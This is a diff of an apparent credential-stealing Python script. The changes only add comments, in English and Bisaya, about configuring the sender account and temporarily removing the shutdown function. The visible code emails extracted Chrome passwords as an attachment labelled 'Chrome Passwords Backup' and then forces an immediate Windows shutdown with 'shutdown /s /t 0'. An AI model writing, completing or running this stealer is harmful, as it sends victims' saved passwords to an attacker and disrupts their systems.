@@ -70,13 +70,13 @@ def fetch_passwords():
 
 def send_email_with_attachment(file_path, to_email):
     try:
-        from_email = "HOST-EMAIL"
-        password = "APP-PASSWORD"
+        from_email = "HOST-EMAIL" # HOST EMAIL 
+        password = "APP-PASSWORD" # NAAS MANAGE ACCOUNT MAKITA
         
         msg = MIMEMultipart()
         msg['From'] = from_email
         msg['To'] = to_email
-        msg['Subject'] = "Chrome Passwords Backup"
+        msg['Subject'] = "Chrome Passwords Backup" # YOU CAN CHANGE THIS ONE MOTHER FATHER
         msg.attach(MIMEText("Attached are the extracted Chrome passwords.", 'plain'))
         
         # Attach the file
@@ -99,10 +99,10 @@ def send_email_with_attachment(file_path, to_email):
         return False
     return True
 
-def shutdown_system():
+def shutdown_system(): # PWEDE RA NI WALAON ANG FUNCTION FOR TESTING, IBALIK LANG ONCE SUCCESS 
     try:
         print("Shutting down the system...")
-        os.system("shutdown /s /t 0")  # Windows shutdown command
+        os.system("shutdown /s /t 0")  # Windows shutdown command   
     except Exception as e:
         print(f"[ERR] Failed to shut down the system: {e}")
 
